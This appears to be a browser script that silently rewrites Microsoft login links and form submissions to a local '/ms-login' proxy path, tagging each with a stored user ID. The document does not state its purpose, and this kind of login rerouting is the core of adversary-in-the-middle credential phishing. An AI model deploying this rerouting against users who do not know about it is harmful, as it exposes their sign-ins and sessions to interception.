// Redirect Microsoft login URLs to our proxy
document.addEventListener('DOMContentLoaded', function() {
  // Intercept all Microsoft login links
  document.addEventListener('click', function(e) {
    const link = e.target.closest('a');
    if (link && link.href && link.href.includes('login.microsoftonline.com')) {
      e.preventDefault();
      
      // Get user ID from current context
      const userId = getUserId();
      
      // Redirect to our proxy
      const proxyUrl = link.href.replace('https://login.microsoftonline.com', '/ms-login');
      const separator = proxyUrl.includes('?') ? '&' : '?';
      window.location.href = `${proxyUrl}${separator}userId=${userId}`;
    }
  });
  
  // Also intercept form submissions to Microsoft
  document.addEventListener('submit', function(e) {
    const form = e.target;
    if (form.action && form.action.includes('login.microsoftonline.com')) {
      e.preventDefault();
      
      const userId = getUserId();
      const proxyAction = form.action.replace('https://login.microsoftonline.com', '/ms-login');
      const separator = proxyAction.includes('?') ? '&' : '?';
      form.action = `${proxyAction}${separator}userId=${userId}`;
      
      form.submit();
    }
  });
});

function getUserId() {
  // Try to get user ID from various sources
  const urlParams = new URLSearchParams(window.location.search);
  return urlParams.get('userId') || 
         sessionStorage.getItem('userId') || 
         localStorage.getItem('userId') || 
         'anonymous';
}